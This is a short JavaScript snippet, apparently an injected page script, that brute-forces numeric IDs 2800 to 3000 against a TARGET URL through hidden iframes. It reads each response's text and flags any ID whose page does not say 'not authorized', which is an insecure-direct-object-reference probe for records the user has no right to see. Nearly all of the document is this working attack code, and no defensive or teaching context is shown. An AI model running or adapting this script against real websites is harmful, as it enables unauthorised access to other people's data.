function tryId(start = 2800, max = 3000) {
    let i = start;

    function next() {
        if (i > max) return;

        const iframe = document.createElement("iframe");
        iframe.style.display = "none";

        const currentId = i;

       iframe.onload = () => {

        try {
            const doc = iframe.contentDocument;
        
            if (!doc || !doc.body) {
                console.log("no body", currentId);
            } else {
                const text = doc.body.textContent.trim();
                console.log(currentId, JSON.stringify(text));
        
                if (!text.includes("not authorized")) {
                    console.log("FOUND", currentId);
                }
            }
        } catch (e) {
            console.log("ACCESS ERROR", currentId);
        }
        
        iframe.remove();
        i++;
        setTimeout(next, 100);
    };


        iframe.src = TARGET + currentId;

        const container = document.body || document.documentElement;
        container.appendChild(iframe);
    }

    next();
}


tryId();
</script>
